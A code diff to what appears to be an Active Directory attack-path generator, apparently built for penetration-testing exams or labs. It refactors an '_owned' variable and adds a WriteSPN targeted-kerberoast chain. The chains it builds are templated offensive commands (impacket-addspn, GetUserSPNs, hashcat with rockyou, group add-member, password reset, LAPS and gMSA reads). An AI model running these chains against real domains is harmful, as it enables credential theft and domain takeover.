@@ -698,6 +698,8 @@ def run(report, store, ui=None):
             _psid = edge.get("principal", "") or ""
             _pname = store.resolve_sid(_psid) or ""
             actor = f"{_pname}" if _pname else _psid or "<owned-user>"
+            # iter-41: consolidated so every branch doesn't re-derive it
+            _owned = _pname if _pname else "<owned-user>"
             # iter-37: DCSync rights - direct DCSync without needing to
             # gain admin first. Highest-value ACL-edge chain because it
             # yields krbtgt (which then enables R-GOLDEN at score 15).
@@ -713,7 +715,6 @@ def run(report, store, ui=None):
                 _dom_ds = store.dominant_domain() or "<DOM>"
                 # iter-39: use resolved principal name in owned-user slot
                 # when known, so the operator can paste directly.
-                _owned = _pname if _pname else "<owned-user>"
                 chains.append(Chain("R-DCSYNC", "direct DCSync via ACL",
                     f"DCSync rights: {actor} on {tgt} (GetChanges + "
                     f"GetChangesAll)",
@@ -727,7 +728,6 @@ def run(report, store, ui=None):
                     ], src=edge["src"], line=edge["line"]))
                 continue
             if r == "AddKeyCredentialLink":
-                _owned = _pname if _pname else "<owned-user>"
                 chains.append(Chain("R-SHADOW", "shadow credentials",
                     f"AddKeyCredentialLink: {actor} -> {tgt} "
                     f"(Shadow Creds -> PKINIT -> NT hash)",
@@ -744,7 +744,6 @@ def run(report, store, ui=None):
                 computer = (edge.get("target_kind") == "computers"
                             or tgt.endswith("$"))
                 # iter-40: resolve principal for -u '<owned-user>' slot.
-                _owned = _pname if _pname else "<owned-user>"
                 if computer:
                     # Derive sam-style host name (no $/.fqdn) for RBCD CLI.
                     # 'WEB01.HTB.LOCAL' -> 'WEB01'; 'WEB01$' -> 'WEB01'.
@@ -776,7 +775,6 @@ def run(report, store, ui=None):
                             f"netexec smb <DC> -u '{tgt}' -p '<NewP@ss123!>' --shares",
                         ], src=edge["src"], line=edge["line"]))
             elif r == "ForceChangePassword":
-                _owned = _pname if _pname else "<owned-user>"
                 chains.append(Chain("R-WRITEDACL", "ForceChangePassword",
                     f"ForceChangePassword: {actor} -> {tgt}",
                     crit=7, conf=0.8, ready=1.4, prox=0.85,         # score 6.66
@@ -785,7 +783,6 @@ def run(report, store, ui=None):
                         f"-U '<dom>/{_owned}%<password>' -S <DC>",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "ReadGMSAPassword":
-                _owned = _pname if _pname else "<owned-user>"
                 chains.append(Chain("R-GMSA-READ", "read gMSA password",
                     f"ReadGMSAPassword: {actor} -> {tgt}",
                     crit=8, conf=0.9, ready=1.5, prox=0.9,          # score 9.72
@@ -795,7 +792,6 @@ def run(report, store, ui=None):
                         f"-p '<password>' -d '<dom>' -l <DC>",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "ReadLAPSPassword":
-                _owned = _pname if _pname else "<owned-user>"
                 chains.append(Chain("R-LAPS-READ", "read LAPS password",
                     f"ReadLAPSPassword: {actor} -> {tgt}",
                     crit=8, conf=0.9, ready=1.5, prox=0.9,          # score 9.72
@@ -804,13 +800,29 @@ def run(report, store, ui=None):
                         f"--laps  # filter to {tgt}",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "AddMember":
-                _owned = _pname if _pname else "<owned-user>"
                 chains.append(Chain("R-ADDMEMBER", "AD group add-member",
                     f"AddMember: {actor} -> group {tgt}",
                     crit=6, conf=0.7, ready=1.3, prox=0.8,
                     commands=[
                         f"impacket-net rpc group addmem '{tgt}' '{_owned}' "
                         f"-U '<dom>/{_owned}%<password>' -S <DC>",
+                    ], src=edge["src"], line=edge["line"]))
+            elif r == "WriteSPN":
+                # iter-41: targeted kerberoast. WriteSPN lets us set an SPN
+                # on any user (that itself has no SPN today), then request
+                # a TGS for that SPN which encrypts with the target's NT
+                # hash - offline crackable. Exam-legal, no relay.
+                chains.append(Chain("R-WRITESPN", "targeted kerberoast",
+                    f"WriteSPN: {actor} -> {tgt} "
+                    f"(set fake SPN -> kerberoast -> crack {tgt})",
+                    crit=8, conf=0.85, ready=1.4, prox=0.9,       # score 8.57
+                    commands=[
+                        f"impacket-addspn -u '<dom>\\{_owned}' -p '<password>' "
+                        f"-t '{tgt}' -s 'HTTP/kerberoast' <DC>",
+                        f"impacket-GetUserSPNs -request-user '{tgt}' "
+                        f"-dc-ip <DC> '<dom>/{_owned}:<password>' | tee tgs.txt",
+                        "hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule",
+                        "# then PtH the recovered NT hash (see R7)",
                     ], src=edge["src"], line=edge["line"]))
     # SAM/SYSTEM/SECURITY triad in one dir -> local secretsdump (no network).
     # iter-13: conf=1.0 was 'command will succeed', but conf encodes 'likelihood
